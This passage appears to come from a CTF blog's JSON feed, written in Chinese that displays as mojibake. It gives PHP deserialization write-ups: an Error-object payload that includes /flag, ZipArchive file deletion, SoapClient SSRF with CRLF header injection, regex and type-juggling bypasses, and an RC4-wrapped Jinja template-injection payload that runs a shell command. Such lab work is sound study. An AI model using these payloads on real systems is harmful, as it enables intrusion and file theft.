class=\"string\">&quot;&lt;br&gt;&quot;</span>;  </span><br><span class=\"line\"><span class=\"keyword\">if</span>(<span class=\"title function_ invoke__\">sha1</span>(<span class=\"variable\">$a</span>)===<span class=\"title function_ invoke__\">sha1</span>(<span class=\"variable\">$b</span>))&#123;  </span><br><span class=\"line\">    <span class=\"keyword\">echo</span> <span class=\"string\">&quot;shq1ç›¸ç­‰&quot;</span>;  </span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>ä¾‹é¢˜:[æå®¢å¤§æŒ‘æˆ˜ 2020] Greatphp</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">error_reporting(0);</span><br><span class=\"line\">class SYCLOVER &#123;</span><br><span class=\"line\">    public $syc;</span><br><span class=\"line\">    public $lover;</span><br><span class=\"line\"> </span><br><span class=\"line\">    public function __wakeup()&#123;</span><br><span class=\"line\">        if( ($this-&gt;syc != $this-&gt;lover) &amp;&amp; (md5($this-&gt;syc) === md5($this-&gt;lover)) &amp;&amp; (sha1($this-&gt;syc)=== sha1($this-&gt;lover)) )&#123;</span><br><span class=\"line\">           if(!preg_match(&quot;/\\&lt;\\?php|\\(|\\)|\\&quot;|\\&#x27;/&quot;, $this-&gt;syc, $match))&#123;</span><br><span class=\"line\">               eval($this-&gt;syc);</span><br><span class=\"line\">           &#125; else &#123;</span><br><span class=\"line\">               die(&quot;Try Hard !!&quot;);</span><br><span class=\"line\">           &#125;</span><br><span class=\"line\"> </span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"> </span><br><span class=\"line\">if (isset($_GET[&#x27;great&#x27;]))&#123;</span><br><span class=\"line\">    unserialize($_GET[&#x27;great&#x27;]);</span><br><span class=\"line\">&#125; else &#123;</span><br><span class=\"line\">    highlight_file(__FILE__);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"> </span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n<p>è¦å¯¼å…¥ /flag, è¿‡æ»¤äº†åŒå¼•å·ï¼Œç”¨ url å–åç»•è¿‡</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span>  </span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"title function_ invoke__\">urlencode</span>(~<span class=\"string\">&quot;/flag&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//%D0%99%93%9E%98</span></span><br></pre></td></tr></table></figure>\n<p>payload:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php  </span><br><span class=\"line\">error_reporting(0);  </span><br><span class=\"line\">class SYCLOVER &#123;  </span><br><span class=\"line\">    public $syc;  </span><br><span class=\"line\">    public $lover;  </span><br><span class=\"line\">  </span><br><span class=\"line\">    public function __wakeup()&#123;  </span><br><span class=\"line\">        if( ($this-&gt;syc != $this-&gt;lover) &amp;&amp; (md5($this-&gt;syc) === md5($this-&gt;lover)) &amp;&amp; (sha1($this-&gt;syc)=== sha1($this-&gt;lover)) )&#123;  </span><br><span class=\"line\">            if(!preg_match(&quot;/\\&lt;\\?php|\\(|\\)|\\&quot;|\\&#x27;/&quot;, $this-&gt;syc, $match))&#123;  </span><br><span class=\"line\">                eval($this-&gt;syc);  </span><br><span class=\"line\">            &#125; else &#123;  </span><br><span class=\"line\">                die(&quot;Try Hard !!&quot;);  </span><br><span class=\"line\">            &#125;  </span><br><span class=\"line\">  </span><br><span class=\"line\">        &#125;    &#125;&#125;  </span><br><span class=\"line\">$str=&quot;?&gt;&lt;?=include~&quot;.urldecode(&quot;%D0%99%93%9E%98&quot;).&quot;?&gt;&quot;;  </span><br><span class=\"line\">$payload1=new Error($str,1);$payload2=new Error($str,2);  </span><br><span class=\"line\">$a=new SYCLOVER();  </span><br><span class=\"line\">$a-&gt;syc=$payload1;  </span><br><span class=\"line\">$a-&gt;lover=$payload2;  </span><br><span class=\"line\">echo urlencode(serialize($a));</span><br></pre></td></tr></table></figure>\n<h3 id=\"å››å…¶ä»–ç±»\"><a class=\"markdownIt-Anchor\" href=\"#å››å…¶ä»–ç±»\">#</a> å››ã€‚å…¶ä»–ç±»</h3>\n<h4 id=\"1reflectionclassç±»\"><a class=\"markdownIt-Anchor\" href=\"#1reflectionclassç±»\">#</a> 1.ReflectionClass ç±»</h4>\n<p><strong>ReflectionMethod</strong> ç±»æŠ¥å‘Šæœ‰å…³æ–¹æ³•çš„ä¿¡æ¯ã€‚<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cucGhwLm5ldC9tYW51YWwvemgvY2xhc3MucmVmbGVjdGlvbm1ldGhvZC5waHA=\">å®˜æ–¹æ–‡æ¡£</span><br>\nå¤ç°:<br>\n![[Pasted image 20230608151138.png]]</p>\n<h4 id=\"2ziparchive-æ–‡ä»¶æ“ä½œ\"><a class=\"markdownIt-Anchor\" href=\"#2ziparchive-æ–‡ä»¶æ“ä½œ\">#</a> 2.ZipArchive æ–‡ä»¶æ“ä½œ</h4>\n<p>å¯ä»¥é€šè¿‡æœ¬ç±»æ‰§è¡Œä¸€äº›æ–‡ä»¶æ“ä½œï¼Œåœ¨ CTF å¯ä»¥ç”¨æ¥åˆ é™¤ waf</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php  </span><br><span class=\"line\">$a=new ZipArchive();  </span><br><span class=\"line\">$a-&gt;open(&#x27;waf.php&#x27;,ZipArchive::OVERWRITE);  </span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n<p>ZipArchive::OVERWRITE: æ€»æ˜¯ä»¥ä¸€ä¸ªæ–°çš„å‹ç¼©åŒ…å¼€å§‹ï¼Œæ­¤æ¨¡å¼ä¸‹å¦‚æœå·²ç»å­˜åœ¨åˆ™ä¼šè¢«è¦†ç›–ï¼Œå› ä¸ºæ²¡æœ‰ä¿å­˜ï¼Œæ‰€ä»¥æ•ˆæœå°±æ˜¯åˆ é™¤äº† test.php</p>\n<h4 id=\"3soapclient__call\"><a class=\"markdownIt-Anchor\" href=\"#3soapclient__call\">#</a> 3.SoapClient::__call</h4>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span>  </span><br><span class=\"line\"><span class=\"variable\">$a</span> = <span class=\"keyword\">new</span> <span class=\"title class_\">SoapClient</span>(<span class=\"literal\">null</span>,<span class=\"keyword\">array</span>(<span class=\"string\">&#x27;uri&#x27;</span>=&gt;<span class=\"string\">&#x27;test&#x27;</span>, <span class=\"string\">&#x27;location&#x27;</span>=&gt;<span class=\"string\">&#x27;http://192.168.95.122:8765&#x27;</span>));  </span><br><span class=\"line\"><span class=\"variable\">$b</span> = <span class=\"title function_ invoke__\">serialize</span>(<span class=\"variable\">$a</span>);  </span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"variable\">$b</span>;  </span><br><span class=\"line\"><span class=\"variable\">$c</span> = <span class=\"title function_ invoke__\">unserialize</span>(<span class=\"variable\">$b</span>);  </span><br><span class=\"line\"><span class=\"variable\">$c</span>-&gt;<span class=\"title function_ invoke__\">not_exists_function</span>();</span><br></pre></td></tr></table></figure>\n<p>192.168.95.122 æ˜¯æˆ‘ kali çš„åœ°å€<br>\nï¼[[Pasted image 20230608214231.png]]<br>\n ä»å›¾ç‰‡å¯ä»¥çœ‹å‡º SOAPAction å‚æ•°å¯æ§ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨è¿™é‡Œæ³¨å…¥æ¶æ„çš„æ¢è¡Œï¼Œè¿™æ ·å°±å¯ä»¥æ§åˆ¶ POST æäº¤çš„ header</p>\n<p>ä½†æ˜¯å½“æƒ³ä¼ å…¥ cookie æ—¶ï¼ŒContent-Type åœ¨ SOAPAction çš„ä¸Šé¢ï¼Œæ— æ³•æ§åˆ¶ Content-Type, ä½†åœ¨ User-Agent åé¢ï¼Œè€Œ user-agent å¯ä»¥æ³¨å…¥ CRLF, æ§åˆ¶ Content-Type çš„å€¼</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span>  </span><br><span class=\"line\"><span class=\"variable\">$target</span>=<span class=\"string\">&#x27;http://192.168.95.122:2222&#x27;</span>;  </span><br><span class=\"line\"><span class=\"variable\">$post_string</span> = <span class=\"string\">&#x27;data=something&#x27;</span>;  </span><br><span class=\"line\"><span class=\"variable\">$headers</span> = <span class=\"keyword\">array</span>(  </span><br><span class=\"line\">    <span class=\"string\">&#x27;X-Forwarded-For: 127.0.0.1&#x27;</span>,  </span><br><span class=\"line\">    <span class=\"string\">&#x27;Cookie: PHPSESSID=my_session&#x27;</span>  </span><br><span class=\"line\">);  </span><br><span class=\"line\"><span class=\"variable\">$b</span> = <span class=\"keyword\">new</span> <span class=\"title class_\">SoapClient</span>(<span class=\"literal\">null</span>,<span class=\"keyword\">array</span>(<span class=\"string\">&#x27;location&#x27;</span> =&gt; <span class=\"variable\">$target</span>,<span class=\"string\">&#x27;user_agent&#x27;</span>=&gt;<span class=\"string\">&#x27;wupco^^Content-Type: application/x-www-form-urlencoded^^&#x27;</span>.<span class=\"title function_ invoke__\">join</span>(<span class=\"string\">&#x27;^^&#x27;</span>,<span class=\"variable\">$headers</span>).<span class=\"string\">&#x27;^^Content-Length: &#x27;</span>.(<span class=\"keyword\">string</span>)<span class=\"title function_ invoke__\">strlen</span>(<span class=\"variable\">$post_string</span>).<span class=\"string\">&#x27;^^^^&#x27;</span>.<span class=\"variable\">$post_string</span>,<span class=\"string\">&#x27;uri&#x27;</span>      =&gt; <span class=\"string\">&quot;aaab&quot;</span>));  </span><br><span class=\"line\">  </span><br><span class=\"line\"><span class=\"variable\">$aaa</span> = <span class=\"title function_ invoke__\">serialize</span>(<span class=\"variable\">$b</span>);  </span><br><span class=\"line\"><span class=\"variable\">$aaa</span> = <span class=\"title function_ invoke__\">str_replace</span>(<span class=\"string\">&#x27;^^&#x27;</span>,<span class=\"string\">&quot;\\r\\n&quot;</span>,<span class=\"variable\">$aaa</span>);  </span><br><span class=\"line\"><span class=\"variable\">$aaa</span> = <span class=\"title function_ invoke__\">str_replace</span>(<span class=\"string\">&#x27;&amp;&#x27;</span>,<span class=\"string\">&#x27;&amp;&#x27;</span>,<span class=\"variable\">$aaa</span>);  </span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"variable\">$aaa</span>;  </span><br><span class=\"line\">  </span><br><span class=\"line\"><span class=\"variable\">$c</span> = <span class=\"title function_ invoke__\">unserialize</span>(<span class=\"variable\">$aaa</span>);  </span><br><span class=\"line\"><span class=\"variable\">$c</span>-&gt;<span class=\"title function_ invoke__\">not_exists_function</span>();  </span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<p>![[Pasted image 20230608224011.png]]</p>\n",
            "tags": []
        },
        {
            "id": "https://hq185187.github.io/2023/06/04/nssctf3/",
            "url": "https://hq185187.github.io/2023/06/04/nssctf3/",
            "title": "NSSCTF3",
            "date_published": "2023-06-04T03:29:05.659Z",
            "content_html": "<h2 id=\"31é¹¤åŸæ¯-2021middle-magic\"><a class=\"markdownIt-Anchor\" href=\"#31é¹¤åŸæ¯-2021middle-magic\">#</a> 31.[é¹¤åŸæ¯ 2021] Middle magic</h2>\n<p>è€ƒç‚¹:</p>\n<ul>\n<li>ç»•è¿‡ preg_mathch å‡½æ•°</li>\n<li>sha1 å¼±ç±»å‹æ¯”è¾ƒ</li>\n<li>php json ç»•è¿‡</li>\n</ul>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"title function_ invoke__\">highlight_file</span>(<span class=\"keyword\">__FILE__</span>);</span><br><span class=\"line\"><span class=\"keyword\">include</span> <span class=\"string\">&quot;./flag.php&quot;</span>;</span><br><span class=\"line\"><span class=\"keyword\">include</span> <span class=\"string\">&quot;./result.php&quot;</span>;</span><br><span class=\"line\"><span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>(<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;aaa&#x27;</span>]) &amp;&amp; <span class=\"title function_ invoke__\">strlen</span>(<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;aaa&#x27;</span>]) &lt; <span class=\"number\">20</span>)&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"variable\">$aaa</span> = <span class=\"title function_ invoke__\">preg_replace</span>(<span class=\"string\">&#x27;/^(.*)level(.*)$/&#x27;</span>, <span class=\"string\">&#x27;$&#123;1&#125;&lt;!-- filtered --&gt;$&#123;2&#125;&#x27;</span>, <span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;aaa&#x27;</span>]);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span>(<span class=\"title function_ invoke__\">preg_match</span>(<span class=\"string\">&#x27;/pass_the_level_1#/&#x27;</span>, <span class=\"variable\">$aaa</span>))&#123;</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"string\">&quot;here is level 2&quot;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (<span class=\"keyword\">isset</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;admin&#x27;</span>]) <span class=\"keyword\">and</span> <span class=\"keyword\">isset</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;root_pwd&#x27;</span>])) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;admin&#x27;</span>] == <span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;root_pwd&#x27;</span>])</span><br><span class=\"line\">                <span class=\"keyword\">echo</span> <span class=\"string\">&#x27;&lt;p&gt;The level 2 can not pass!&lt;/p&gt;&#x27;</span>;</span><br><span class=\"line\">            <span class=\"comment\">// START FORM PROCESSING</span></span><br><span class=\"line\">            <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (<span class=\"title function_ invoke__\">sha1</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;admin&#x27;</span>]) === <span class=\"title function_ invoke__\">sha1</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;root_pwd&#x27;</span>]))&#123;</span><br><span class=\"line\">                <span class=\"keyword\">echo</span> <span class=\"string\">&quot;here is level 3,do you kown how to overcome it?&quot;</span>;</span><br><span class=\"line\">                <span class=\"keyword\">if</span> (<span class=\"keyword\">isset</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;level_3&#x27;</span>])) &#123;</span><br><span class=\"line\">                    <span class=\"variable\">$level_3</span> = <span class=\"title function_ invoke__\">json_decode</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;level_3&#x27;</span>]);</span><br><span class=\"line\"></span><br><span class=\"line\">                    <span class=\"keyword\">if</span> (<span class=\"variable\">$level_3</span>-&gt;result == <span class=\"variable\">$result</span>) &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">                        <span class=\"keyword\">echo</span> <span class=\"string\">&quot;success:&quot;</span>.<span class=\"variable\">$flag</span>;</span><br><span class=\"line\">                    &#125;</span><br><span class=\"line\">                    <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">                        <span class=\"keyword\">echo</span> <span class=\"string\">&quot;you never beat me!&quot;</span>;</span><br><span class=\"line\">                    &#125;</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">                <span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">                    <span class=\"keyword\">echo</span> <span class=\"string\">&quot;out&quot;</span>;</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            <span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">                <span class=\"keyword\">die</span>(<span class=\"string\">&quot;no&quot;</span>);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            <span class=\"comment\">// perform validations on the form data</span></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">            <span class=\"keyword\">echo</span> <span class=\"string\">&#x27;&lt;p&gt;out!&lt;/p&gt;&#x27;</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"string\">&#x27;nonono!&#x27;</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">echo</span> <span class=\"string\">&#x27;&lt;hr&gt;&#x27;</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<ul>\n<li>\n<p>ç¬¬ä¸€ä¸ª preg_replace ç»•è¿‡ç›¸å½“äºç»•è¿‡ preg_match, æ­£åˆ™å†™æ³•æœ‰ç¼ºé™·ï¼Œ <code>.</code>  ç”¨äºä»»æ„å­—ç¬¦åŒ¹é…ä½†æ˜¯ä¸åŒ…æ‹¬æ¢è¡Œç¬¦ï¼Œè€Œä¸” <code>^$ç•Œå®šäº†å¿…é¡»åœ¨åŒä¸€è¡Œ</code> ï¼Œå¦åˆ™åŒ¹é…ä¸åˆ°ï¼Œç›´æ¥åˆ©ç”¨ %0a æ¢è¡Œç»•è¿‡</p>\n</li>\n<li>\n<p>ç¬¬äºŒä¸ªç®€å• sha1 å¼±ç±»å‹æ¯”è¾ƒï¼Œç›´æ¥æ•°ç»„ç»•è¿‡å°±è¡Œ</p>\n</li>\n<li>\n<p>ç¬¬ä¸‰ä¸ªç›´æ¥ç”¨å¸ƒå°” true ç»•è¿‡</p>\n</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?aaa=%0apass_the_level_1%23</span><br><span class=\"line\">ä¸ºä»€ä¹ˆä¸ç”¨#?å› ä¸º#åœ¨urlä¸­è¡¨ç¤ºç•Œå®šç¬¦</span><br><span class=\"line\">post:</span><br><span class=\"line\">admin[]=1&amp;root_pwd[]=2&amp;level_3=&#123;&quot;result&quot;:true&#125;;</span><br></pre></td></tr></table></figure>\n<h2 id=\"32nisactf-2022is-secret\"><a class=\"markdownIt-Anchor\" href=\"#32nisactf-2022is-secret\">#</a> 32.[NISACTF 2022]is secret</h2>\n<p>dirsearch æ‰«ä¸€ä¸‹ç›®å½•å‘ç° robots.txt,secret,console<br>\n è¿›å…¥ robots.txt æ˜¾ç¤ºè¿™æ˜¯ä¸€ä¸ªå®‰å“ç¨‹åº<br>\nè¿›å…¥ secret å¯ä»¥ä¼  <code>?secret=&#123;&#123;7*6&#125;&#125;</code>  è¿”å›è°ƒè¯•æŠ¥é”™<br>\nå‘ç°æ˜¯ rc4 åŠ å¯†ï¼Œå¯†é’¥æ˜¯ HereIsTreasure, ç”¨å¤§ä½¬è„šæœ¬</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> base64  </span><br><span class=\"line\"><span class=\"keyword\">from</span> urllib <span class=\"keyword\">import</span> parse  </span><br><span class=\"line\">  </span><br><span class=\"line\">  </span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">rc4_main</span>(<span class=\"params\">key=<span class=\"string\">&quot;init_key&quot;</span>, message=<span class=\"string\">&quot;init_message&quot;</span></span>):  </span><br><span class=\"line\"><span class=\"comment\"># print(&quot;RC4åŠ å¯†ä¸»å‡½æ•°&quot;)  </span></span><br><span class=\"line\">s_box = rc4_init_sbox(key)  </span><br><span class=\"line\">crypt = <span class=\"built_in\">str</span>(rc4_excrypt(message, s_box))  </span><br><span class=\"line\"><span class=\"keyword\">return</span> crypt  </span><br><span class=\"line\">  </span><br><span class=\"line\">  </span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">rc4_init_sbox</span>(<span class=\"params\">key</span>):  </span><br><span class=\"line\">s_box = <span class=\"built_in\">list</span>(<span class=\"built_in\">range</span>(<span class=\"number\">256</span>)) <span class=\"comment\"># æˆ‘è¿™é‡Œæ²¡ç®¡ç§˜é’¥å°äº256çš„æƒ…å†µï¼Œå°äº256ä¸æ–­é‡å¤å¡«å……å³å¯  </span></span><br><span class=\"line\"><span class=\"comment\"># print(&quot;åŸæ¥çš„ s ç›’ï¼š%s&quot; % s_box)  </span></span><br><span class=\"line\">j = <span class=\"number\">0</span>  </span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">256</span>):  </span><br><span class=\"line\">j = (j + s_box[i] + <span class=\"built_in\">ord</span>(key[i % <span class=\"built_in\">len</span>(key)])) % <span class=\"number\">256</span>  </span><br><span class=\"line\">s_box[i], s_box[j] = s_box[j], s_box[i]  </span><br><span class=\"line\"><span class=\"comment\"># print(&quot;æ··ä¹±åçš„ s ç›’ï¼š%s&quot;% s_box)  </span></span><br><span class=\"line\"><span class=\"keyword\">return</span> s_box  </span><br><span class=\"line\">  </span><br><span class=\"line\">  </span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">rc4_excrypt</span>(<span class=\"params\">plain, box</span>):  </span><br><span class=\"line\"><span class=\"comment\"># print(&quot;è°ƒç”¨åŠ å¯†ç¨‹åºæˆåŠŸã€‚&quot;)  </span></span><br><span class=\"line\">res = []  </span><br><span class=\"line\">i = j = <span class=\"number\">0</span>  </span><br><span class=\"line\"><span class=\"keyword\">for</span> s <span class=\"keyword\">in</span> plain:  </span><br><span class=\"line\">i = (i + <span class=\"number\">1</span>) % <span class=\"number\">256</span>  </span><br><span class=\"line\">j = (j + box[i]) % <span class=\"number\">256</span>  </span><br><span class=\"line\">box[i], box[j] = box[j], box[i]  </span><br><span class=\"line\">t = (box[i] + box[j]) % <span class=\"number\">256</span>  </span><br><span class=\"line\">k = box[t]  </span><br><span class=\"line\">res.append(<span class=\"built_in\">chr</span>(<span class=\"built_in\">ord</span>(s) ^ k))  </span><br><span class=\"line\"><span class=\"comment\"># print(&quot;resç”¨äºåŠ å¯†å­—ç¬¦ä¸²ï¼ŒåŠ å¯†åæ˜¯ï¼š%res&quot; %res)  </span></span><br><span class=\"line\">cipher = <span class=\"string\">&quot;&quot;</span>.join(res)  </span><br><span class=\"line\"><span class=\"comment\"># print(&quot;åŠ å¯†åçš„å­—ç¬¦ä¸²æ˜¯ï¼š\\n%s&quot; %cipher)  </span></span><br><span class=\"line\">enc_url = parse.quote(cipher)  </span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&quot;åŠ å¯†åçš„urlç¼–ç :\\n&quot;</span> + enc_url)  </span><br><span class=\"line\"><span class=\"comment\"># print(&quot;åŠ å¯†åçš„è¾“å‡º(ç»è¿‡base64ç¼–ç ):&quot;)  </span></span><br><span class=\"line\"><span class=\"comment\"># print(str(base64.b64encode(cipher.encode(&#x27;utf-8&#x27;)), &#x27;utf-8&#x27;))  </span></span><br><span class=\"line\"><span class=\"keyword\">return</span> (<span class=\"built_in\">str</span>(base64.b64encode(cipher.encode(<span class=\"string\">&#x27;utf-8&#x27;</span>)), <span class=\"string\">&#x27;utf-8&#x27;</span>))  </span><br><span class=\"line\">  </span><br><span class=\"line\">  </span><br><span class=\"line\">rc4_main(<span class=\"string\">&quot;HereIsTreasure&quot;</span>, <span class=\"string\">&#x27;&#x27;&#x27;&#123;&#123;config.__class__.__init__.__globals__[&#x27;os&#x27;].popen(&#x27;cat /flag.txt&#x27;).read()&#125;&#125;&#x27;&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure>\n<h2 id=\"33nisactf-2022middlerce\"><a class=\"markdownIt-Anchor\" href=\"#33nisactf-2022middlerce\">#</a> 33.[NISACTF 2022]middlerce</h2>\n<p>PRCE å‰ç½®çŸ¥è¯†:<span class=\"exturl\" 